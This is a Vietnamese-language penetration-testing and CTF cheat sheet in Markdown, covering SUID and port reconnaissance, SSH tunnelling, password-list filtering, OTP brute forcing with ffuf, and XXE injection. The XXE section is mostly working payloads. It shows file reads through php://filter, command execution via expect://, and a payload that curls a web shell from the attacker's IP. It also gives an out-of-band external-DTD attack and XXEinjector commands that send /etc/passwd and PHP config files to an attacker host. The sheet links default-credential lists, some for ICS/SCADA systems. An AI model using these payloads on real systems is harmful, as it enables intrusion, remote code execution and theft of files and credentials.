# Penetration Testing & CTF Cheat Sheet

Một bảng tra cứu nhanh (Cheat Sheet) các lệnh hữu ích phục vụ cho quá trình Pentest, CTF, leo thang đặc quyền và khai thác lỗ hổng Web (XXE).

---

## 📋 Mục lục
1. [Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)](#1-trinh-sát--kiểm-tra-hệ-thống-reconnaissance)
2. [Kết Nối Từ Xa & Chuyển Tiếp Cổng (Port Forwarding)](#2-kết-nối-từ-xa--chuyển-tiếp-cổng-port-forwarding)
3. [Xử Lý Wordlist & Biến Đổi Chuỗi (Data Manipulation)](#3-xử-lý-wordlist--biến-đổi-chuỗi-data-manipulation)
4. [Tấn Công Dò Thám (Brute Force)](#4-tấn-công-dò-thám-brute-force)
5. [Khai Thác Lỗ Hổng XXE Injection](#5-khai-thác-lỗ-hổng-xxe-injection)
   * [Payloads Cơ Bản & Nâng Cao](#payloads-cơ-bản--nâng-cao)
   * [Khai thác Nâng cao bằng CDATA và External DTD](#khai-thác-nâng-cao-bằng-cdata-và-external-dtd)
   * [Tự động hóa với XXEinjector](#tự-động-hóa-với-xxeinjector)
6. [Tài Nguyên & Danh Sách Hữu Ích (Wordlists & Datasets)](#6-tài-nguyên--danh-sách-hữu-ích-wordlists--datasets)

---

## 1. Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)

### Kiểm tra các file có quyền SUID (Set Owner User ID)
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Kiểm tra các tiến trình đang chạy ẩn nội bộ của quyền root
```bash
ps aux | grep root
```

### Kiểm tra các cổng đang lắng nghe (Dùng `netstat`)
```bash
netstat -tulnp
```

### Kiểm tra các cổng đang lắng nghe (Dùng `ss` nếu không có `netstat`)
```bash
ss -tulnp
```

---

## 2. Kết Nối Từ Xa & Chuyển Tiếp Cổng (Port Forwarding)

### Chuyển cổng (Local Port Forwarding) qua SSH
```bash
ssh -L 2121:127.0.0.1:21 sshuser@154.57.164.72 -p 31873
```

### Kết nối từ xa trên Windows
Sử dụng công cụ mặc định: `Remote Desktop Connection` (RDP).

### Kết nối từ xa từ Linux sang Windows (Dùng `xfreerdp`)
```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

---

## 3. Xử Lý Wordlist & Biến Đổi Chuỗi (Data Manipulation)

### Lọc mật khẩu theo Regex
*Điều kiện: Độ dài >= 10, chứa ít nhất 1 chữ hoa, 1 chữ thường và 1 chữ số.*
```bash
awk 'length(\$0) >= 10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' rockyou.txt > pass_da_loc.txt
```

### Tạo chuỗi số tăng dần có độ dài bằng nhau (Cờ `-w` thêm số 0 ở trước)
```bash
seq -w 1 9999
```

### Xử lý chuỗi nhanh trên Linux
* `echo -n "chuỗi"`: Không tự động thêm ký tự xuống dòng (`\n`) ở cuối.
* `base64 -w 0`: Mã hóa Base64 và ép toàn bộ kết quả hiển thị trên một dòng duy nhất.
* `tr -d ' -'`: Xóa toàn bộ dấu cách (khoảng trắng) và dấu gạch ngang (`-`) trong chuỗi.

---

## 4. Tấn Công Dò Thám (Brute Force)

### Brute force mã OTP bằng `ffuf`
```bash
ffuf -w <FILE_NAME> -u <TARGET_HOST> -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "session=<SESSION_COOKIE>" \
     -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

---

## 5. Khai Thác Lỗ Hổng XXE Injection

### Payloads Cơ Bản & Nâng Cao

#### Mã hóa nội dung bằng PHP Filter để đọc file mã nguồn (Tránh lỗi định dạng)
```xml
<!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=abc.php">
```

#### Thực thi lệnh hệ thống qua XXE (Yêu cầu target cài module `expect`)
```xml
<!ENTITY company SYSTEM "expect://id">
```

#### Tải Web Shell về server mục tiêu thông qua XXE (Sử dụng `$IFS` thay khoảng trắng)
```xml
<!ENTITY company SYSTEM "expect://curl\({IFS}-O\){IFS}'OUR_IP/shell.php'">
```

#### Đọc file chứa ký tự đặc biệt bằng cách bọc trong thẻ CDATA (Mẫu cấu hình)
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % joined "&begin;&file;&end;">
]>
```

---

### Khai thác Nâng cao bằng CDATA và External DTD

Khi máy chủ mục tiêu chạy các ứng dụng không phải PHP (hoặc không thể dùng bộ lọc `php://filter`), việc đọc trực tiếp các tệp chứa ký tự đặc biệt như `<`, `>`, `&` sẽ làm hỏng cấu trúc XML. Chúng ta bắt buộc phải sử dụng **XML Parameter Entities (`%`)** nạp từ máy chủ từ xa của kẻ tấn công nhằm bọc dữ liệu vào thẻ `CDATA`.

#### 🛠 Các bước thực hiện:

**Bước 1: Tạo tệp DTD cấu hình nối chuỗi trên máy của bạn (`xxe.dtd`)**
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

**Bước 2: Khởi tạo Web Server công khai để lưu trữ tệp DTD**
```bash
python3 -m http.server 8000
```
*(Nếu cần public ra Internet qua mạng NAT, sử dụng: `ngrok http 8000`)*

**Bước 3: Gửi payload XXE trong HTTP Request tới mục tiêu**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "https://ngrok-free.dev"> 
  %xxe;
]>
<root>
  <name>test</name>
  <tel>123456</tel>
  <email>&joined;</email> 
</root>
```

#### 🔄 Cơ chế hoạt động:
1. Máy chủ mục tiêu ghi nhận đầu thẻ vào `%begin;`, tệp cần đọc vào `%file;`, và đuôi thẻ vào `%end;`.
2. Khi gặp lệnh gọi `%xxe;`, XML Parser tải file `xxe.dtd` từ máy tấn công về.
3. Do dòng mã ghép chuỗi được nạp từ External DTD, XML Parser phá bỏ giới hạn bảo mật, cho phép ghép nối thành công thực thể thông thường `&joined;`.
4. Thẻ `<email>&joined;</email>` xuất dữ liệu mã nguồn tệp mục tiêu ra màn hình an toàn mà không làm vỡ cấu trúc XML.

> [!WARNING]
> **Lưu ý kiểm thử:** Một số máy chủ chặn việc tự tham chiếu tệp (Entity reference loop) gây lỗi DOS. Cấu hình XML Parser của mục tiêu bắt buộc phải bật tính năng xử lý External Entity (`LIBXML_DTDLOAD` và `LIBXML_NOENT`).

---

### Tự động hóa với XXEinjector

[XXEinjector](https://github.com) là công cụ chuyên tự động hóa quá trình khai thác lỗ hổng **Blind XXE** thông qua các giao thức Out-of-Band (OOB) như HTTP, FTP, Gopher.

#### 🛠 Chuẩn bị file Request mẫu (`request.txt`)
Bắt gói tin HTTP chứa dữ liệu XML bằng Burp Suite, lưu vào một file text và chèn từ khóa `XXEINJECT` tại vùng nhận dữ liệu:
```http
POST /process_xml.php HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<search>
    <keyword>XXEINJECT</keyword>
</search>
```

#### 🚀 Các lệnh khai thác phổ biến:

* **Đọc file hệ thống cơ bản (Linux):**
  ```bash
  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc/passwd --oob=http
  ```
* **Đọc file mã nguồn PHP (Tự động hóa Base64 Filter):**
  ```bash
  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/var/www/html/config.php --oob=http --phpfilter
  ```
* **Liệt kê thư mục (Chỉ áp dụng với Java):**
  ```bash
  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc --oob=http
  ```
* **Khai thác qua HTTPS (SSL):**
  ```bash
  ruby XXEinjector.rb --host=[IP_CỦA_BẠN] --file=request.txt --path=/etc/passwd --oob=http --ssl
  ```

#### 📊 Bảng tra cứu Flags quan trọng:

| Tham số | Ý nghĩa |
| :--- | :--- |
| `--host` | Địa chỉ IP máy tấn công của bạn để mở cổng hứng dữ liệu trả về. |
| `--file` | Đường dẫn tới tệp tin chứa request HTTP mẫu (`request.txt`). |
| `--path` | Đường dẫn của tệp tin hoặc thư mục cần trích xuất trên mục tiêu. |
| `--oob` | Giao thức Out-of-Band sử dụng (`http`, `ftp`, `gopher`). |
| `--phpfilter` | Bật bộ lọc mã hóa Base64 của PHP để tránh lỗi ký tự đặc biệt. |
| `--ssl` | Bật chế độ hỗ trợ SSL/HTTPS cho gói tin gửi đi. |

---

## 6. Tài Nguyên & Danh Sách Hữu Ích (Wordlists & Datasets)

* **Danh sách Username phổ biến:** [SecLists Usernames](https://github.com)
* **Danh sách thông tin đăng nhập mặc định:** [SecLists Default Credentials](https://github.com)
* **Tài khoản mặc định của hệ thống điều khiển công nghiệp (ICS/SCADA):** [SCADAPASS](https://github.com)
* **Dữ liệu tên các thành phố trên thế giới:** [World Cities Dataset](https://github.com)
